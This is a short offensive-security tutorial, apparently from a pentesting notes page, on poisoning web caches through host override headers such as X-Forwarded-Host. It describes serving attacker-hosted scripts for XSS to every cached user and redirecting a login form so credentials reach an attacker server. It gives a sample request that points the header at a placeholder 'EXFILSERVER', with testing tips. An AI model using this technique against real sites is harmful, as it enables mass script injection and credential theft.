**Webcache poison via HOST Headers**
This attack happens when we can poison the webcache key via Ovveride host headers.  Usually the HostHeader=KEYED in most of nowadays webcache as it is used to form the request structure to be cached and almost never can be poisoned... But if the backend supports Ovverride headers we might use those to poison the webcache!

### What can be performed?
1)Since the web application uses our malicious input for a JavaScript import, we could point it to a server under our control, host a script file, and execute an XSS attack against all users that get served the poisoned cache
2)Since the web application also uses our malicious input for the action of the login form, we could point it to a server under our control and wait for a user to log in. This would send the login credentials to our server

## Attack Scenario
Let's take as an example where the Host header is used to reflect it's value in a form login function.
To identify if we can inject we might try to add Ovveride-Headers to request and see if the reflected values changes in the response body:
```
GET /login.php HTTP/1.1
Host: VALID
X-Forwarded-Host: EXFILSERVER
```
(If the URL reflects the value from the OverrideHeader then you are gucci)
**TIPS:**
1)You might need to test for several Override headers before fiding the one that works!
2)You might need to remove Origin,Refer etc headers from base request otherwise will not go thru
